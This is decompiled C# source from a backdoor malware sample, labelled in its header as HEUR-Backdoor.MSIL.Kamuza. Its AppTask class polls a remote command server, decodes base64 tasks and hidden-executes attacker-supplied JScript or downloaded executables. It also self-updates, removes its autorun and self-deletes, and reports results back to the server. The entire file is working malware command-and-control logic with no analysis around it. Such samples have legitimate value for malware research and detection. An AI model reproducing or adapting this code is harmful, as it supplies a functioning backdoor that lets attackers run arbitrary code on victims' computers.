// Decompiled with JetBrains decompiler
// Type: JSS.AppTask
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace JSS
{
  internal class AppTask
  {
    public const int ANSWER_OK = 0;
    public static int CurrentTaskID;

    public static void DoTask()
    {
      try
      {
        TaskData task = AppTask.GetTask();
        if (task.Code == TaskCode.TASK_IDLE)
          return;
        AppTask.PutAnswer(AppTask.ExecuteTask(task));
      }
      catch (Exception ex)
      {
        AnswerData theAnswer = new AnswerData()
        {
          ID = AppTask.CurrentTaskID,
          Code = 1,
          Data = Encoding.ASCII.GetBytes(ex.Message)
        };
        try
        {
          AppTask.PutAnswer(theAnswer);
        }
        catch
        {
        }
      }
    }

    private static TaskData GetTask()
    {
      TaskData taskData = new TaskData()
      {
        Code = TaskCode.TASK_IDLE
      };
      string theTask = App.JssHttp.Get(AppParams.URL_GetTask);
      return string.IsNullOrEmpty(theTask) ? taskData : AppTask.Validate(AppTask.Unpack(theTask));
    }

    private static AnswerData ExecuteTask(TaskData theTask)
    {
      AnswerData theAnswer = new AnswerData()
      {
        ID = theTask.ID,
        Code = 0,
        Data = (byte[]) null
      };
      switch (theTask.Code)
      {
        case TaskCode.TASK_FORM:
          AppTask.Execute_TaskForm(theTask.Data, ref theAnswer);
          break;
        case TaskCode.TASK_JS:
          AppTask.Execute_TaskJS(theTask.Data, ref theAnswer);
          break;
        case TaskCode.TASK_EXE:
          AppTask.Execute_TaskExe(theTask.Data, theTask.Options, ref theAnswer);
          break;
        case TaskCode.TASK_UPDATE:
          AppTask.Execute_TaskUpdate(theTask.Data, ref theAnswer);
          break;
        case TaskCode.TASK_UNINST:
          AppTask.Execute_TaskUninstall(theTask.Data, ref theAnswer);
          break;
      }
      return theAnswer;
    }

    public static void SendReport(string theReport)
    {
      try
      {
        AppTask.PutAnswer(new AnswerData()
        {
          ID = 0,
          Code = 0,
          Data = Encoding.ASCII.GetBytes(theReport)
        });
      }
      catch (Exception ex)
      {
      }
    }

    private static void PutAnswer(AnswerData theAnswer)
    {
      string theAnswer1 = AppTask.Pack(theAnswer);
      App.JssHttp.Put(AppParams.URL_PutAnswer, theAnswer1);
    }

    private static TaskData Unpack(string theTask)
    {
      string[] strArray = theTask.Trim().Split('\n');
      TaskData taskData = strArray.Length >= 2 ? new TaskData()
      {
        ID = AppTask.B64DecodeInt32("ID", strArray[0]),
        Code = (TaskCode) AppTask.B64DecodeInt32("Code", strArray[1])
      } : throw new Exception(string.Format("AppTask.Unpack() Invalid task structure: number of fields is '{0}', must be '2+'", (object) strArray.Length));
      AppTask.CurrentTaskID = taskData.ID;
      if (strArray.Length >= 3)
        taskData.Data = AppTask.B64Decode("Data", strArray[2]);
      if (strArray.Length >= 4)
        taskData.Options = AppTask.B64Decode("Data", strArray[3]);
      return taskData;
    }

    private static TaskData Validate(TaskData theTask)
    {
      if (!Enum.IsDefined(typeof (TaskCode), (object) theTask.Code))
        throw new Exception(string.Format("AppTask.Unpack() Task {0}. Field 'Code' contains invalid value: '{1}'", (object) theTask.ID, (object) theTask.Code));
      switch (theTask.Code)
      {
        case TaskCode.TASK_JS:
          if (theTask.Data == null)
            throw new Exception(string.Format("AppTask.Unpack() Task {0}. Invalid format: '{1}', field 'Data' is empty", (object) theTask.ID, (object) theTask.Code));
          break;
        case TaskCode.TASK_EXE:
          if (theTask.Data == null)
            throw new Exception(string.Format("AppTask.Unpack() Task {0}. Invalid format: '{1}', field 'Data' is empty", (object) theTask.ID, (object) theTask.Code));
          break;
        case TaskCode.TASK_UPDATE:
          if (theTask.Data == null)
            throw new Exception(string.Format("AppTask.Unpack() Task {0}. Invalid format: '{1}', field 'Data' is empty", (object) theTask.ID, (object) theTask.Code));
          break;
      }
      return theTask;
    }

    private static string Pack(AnswerData theAnswer)
    {
      string str = Convert.ToBase64String(BitConverter.GetBytes(theAnswer.ID)) + "\n" + Convert.ToBase64String(BitConverter.GetBytes((uint) theAnswer.Code));
      if (theAnswer.Data != null)
        str = str + "\n" + Convert.ToBase64String(theAnswer.Data);
      return str;
    }

    private static byte[] B64Decode(string theName, string theValue) => !string.IsNullOrEmpty(theValue) ? Convert.FromBase64String(theValue) : throw new Exception(string.Format("Field '{0}' is empty", (object) theName));

    private static int B64DecodeInt32(string theName, string theValue) => !string.IsNullOrEmpty(theValue) ? BitConverter.ToInt32(Convert.FromBase64String(theValue), 0) : throw new Exception(string.Format("Field '{0}' is empty", (object) theName));

    private static void Execute_TaskForm(byte[] theData, ref AnswerData theAnswer) => Application.Run((Form) new AppForm());

    private static void Execute_TaskJS(byte[] theData, ref AnswerData theAnswer)
    {
      string path = Environment.ExpandEnvironmentVariables("%userprofile%\\Contacts\\") + Path.GetRandomFileName();
      string contents = Encoding.ASCII.GetString(theData);
      File.WriteAllText(path, contents);
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "C:\\Windows\\System32\\cscript.exe",
          Arguments = string.Format("//e:jscript {0}", (object) path),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }

    private static void Execute_TaskExe(
      byte[] theData,
      byte[] theOptions,
      ref AnswerData theAnswer)
    {
      string path = Environment.ExpandEnvironmentVariables("%userprofile%\\Contacts\\") + Path.GetRandomFileName() + ".exe";
      File.WriteAllBytes(path, theData);
      string str = "";
      if (theOptions != null)
        str = Encoding.ASCII.GetString(theOptions);
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = path,
          Arguments = str,
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }

    private static void Execute_TaskUpdate(byte[] theData, ref AnswerData theAnswer)
    {
      string path = Environment.ExpandEnvironmentVariables("%userprofile%\\Contacts\\") + Path.GetRandomFileName() + ".exe";
      File.WriteAllBytes(path, theData);
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = path,
          Arguments = "",
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
      string codeBase = Assembly.GetExecutingAssembly().GetName().CodeBase;
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          Arguments = string.Format("/c timeout 5 && echo del /f {0}", (object) codeBase),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
      AppAutorun.Reset();
      App.StopRequested = true;
    }

    private static void Execute_TaskUninstall(byte[] theData, ref AnswerData theAnswer)
    {
      try
      {
        AppAutorun.Reset();
        string codeBase = Assembly.GetExecutingAssembly().GetName().CodeBase;
        new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            FileName = "cmd.exe",
            Arguments = string.Format("/c timeout 5 && echo del /f {0}", (object) codeBase),
            UseShellExecute = false,
            CreateNoWindow = true
          }
        }.Start();
      }
      catch
      {
      }
      Environment.Exit(0);
    }
  }
}
